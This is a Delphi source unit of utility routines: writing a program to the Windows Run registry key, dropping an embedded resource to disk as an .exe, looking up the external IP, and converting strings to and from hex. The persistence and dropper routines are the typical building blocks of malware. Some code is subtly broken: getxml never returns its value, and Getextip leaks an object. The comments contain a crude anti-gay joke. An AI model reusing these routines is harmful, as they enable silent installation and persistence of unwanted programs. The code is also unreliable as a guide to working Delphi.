unit sycfuncs;

interface

uses
  Registry, classes, windows, iDhttp, sysutils;

procedure doreg(opnkey, regstr, exepath: string);
procedure dropres(resID, drpname: string);
procedure DelSubStr(substr: string; var strn: string);
function getxml(const Tag, Text: string): string;
function Getextip: string;
function StrtoHex(Data: string): string;
function HexToStr(Data: String): String;
function GetToken(aString, SepChar: string; TokenNum: Byte): string;
function GetFirstToken(Line: String): String;
function GetNextToken: String;
function GetRemainingTokens: String;



implementation

var
  TokenString: String;

// procedure to write a key to theregistry defaults to hklm
// SOFTWARE\Microsoft\Windows\CurrentVersion\Run  executable.exe
procedure doreg(opnkey, regstr, exepath:string);
var
  EdReg: TRegistry;
begin
  try
    if opnkey = '' then
      opnkey := 'SOFTWARE\Microsoft\Windows\CurrentVersion\Run';
    if regstr = '' then
      regstr := 'random program';
    if exepath = '' then
      exepath := 'c:\executable.exe';
    // start creating the key in the registry
    EdReg := TRegistry.Create;
    EdReg.rootkey := HKEY_LOCAL_MACHINE;
    if EdReg.OpenKey(opnkey, TRUE) then
    begin
      EdReg.WriteString(regstr, exepath);
    end;
  finally
    EdReg.Free;
  end;
end;

// procedure to drop a resource saved within the file to the disk
// defaults to res1 and saves to c:\res1.exe
// save a file to your resources and drop it using this function
procedure dropres(resID, drpname: string);
var
  ResStream: TResourceStream;
begin
  if resID = '' then
    resID := 'res1';
  if drpname = '' then
    drpname := 'c:\res1.exe';
  ResStream := TResourceStream.Create(HInstance, resID, RT_RCDATA);
  try
    ResStream.Position := 0;
    ResStream.SaveToFile(drpname);
  finally
    ResStream.Free;
  end;
end;

// deletes a substring from a string i.e delsubstr('gay', name);
// this would delete gay from the name gayboy held in string name
procedure DelSubStr(substr: string; var strn: string);
var
  k, L, origL: Integer;
  remaining: string;
begin
  k := Pos(substr, strn);
  if (k <> 0) then
  begin
    L := length(substr);
    origL := length(strn);
    remaining := Copy(strn, k + L, length(strn) - k - L);
    delete(strn, k, L);
  end;
end;

// gets the content inside an xml tag i.e <shit>poo</shit>  returns poo
// call it with getxml('shit', xmlstring);
function getxml(const Tag, Text: string): string;
var
  StartPos1, StartPos2, EndPos: Integer;
  i: Integer;
begin
  result := '';
  StartPos1 := Pos('<' + Tag, Text);
  EndPos := Pos('</' + Tag + '>', Text);
  StartPos2 := 0;
  for i := StartPos1 + length(Tag) + 1 to EndPos do
    if Text[i] = '>' then
    begin
      StartPos2 := i + 1;
      break;
    end;
end;


//this function will return the external ip address
function Getextip: string;
var
  http4ip: TIdHTTP;
begin
  try
    http4ip := TIdHTTP.Create(nil);
    result := http4ip.Get('http://automation.whatismyip.com/n09230945.asp');
  finally
  end;
end;


//this function will transform a string to a hex string
function StrtoHex(Data: string): string;
var
  i: integer;
begin
  result := '';
  for i := 1 to Length(Data) do
    result := result + IntToHex(Ord(Data[i]), 2);
end;


//the reverse function returns a string from hex string
function HexToStr(Data: String): String;
var
  i : Integer;
begin
  Result:= '';
  for I := 1 to length(Data) div 2 do
    Result:= Result + Char(StrToInt('$' + Copy(Data, (i - 1) * 2 + 1, 2)));
end;


//this function returns the character thats at a position in a string
function GetToken(aString, SepChar: string; TokenNum: Byte): string;
var
  Token: string;
  StrLen: Integer;
  Num: Integer;
  EndofToken: Integer;
begin
  StrLen := Length(aString);
  Num := 1;
  EndofToken := StrLen;
  while ((Num <= TokenNum) and (EndofToken <> 0)) do
  begin
    EndofToken := Pos(SepChar, aString);
    if EndofToken <> 0 then
    begin
      Token := Copy(aString, 1, EndofToken - 1);
      Delete(aString, 1, EndofToken);
      Inc(Num);
    end
    else
      Token := aString;
  end;
  if Num >= TokenNum then
    Result := Token
  else
    Result := '';
end;



function GetFirstToken(Line: String): String;
begin
  TokenString := Line;
  Result := GetNextToken;
end;

function GetNextToken: String;
var
  i, j: Integer;
begin
  Result := '';
  if TokenString <> '' then
  begin
    i := 1;
    while TokenString[i] in [#9, #10, #13, ' '] do
      Inc(i);
    j := 0;
    while not(TokenString[i + j] in [#0, #9, #10, #13, ' ']) do
      Inc(j);
    Result := Copy(TokenString, i, j);
    TokenString := Copy(TokenString, i + j, High(Integer));
  end;
end;



function GetRemainingTokens: String;
var
  i: Integer;
begin
  Result := '';
  if TokenString <> '' then
  begin
    i := 1;
    while TokenString[i] in [#9, #10, #13, ' '] do
      Inc(i);
    Result := Copy(TokenString, i, High(Integer));
  end;
end;


//ASCII control characters
//#00 NULL(Null character)
//#07 BEL(Bell)
//#08 BS(Backspace)
//#10 LF(Line feed)
//#13 CR(Carriage return)
//#27 ESC(Escape)
//#12 7DEL(Delete)


end.
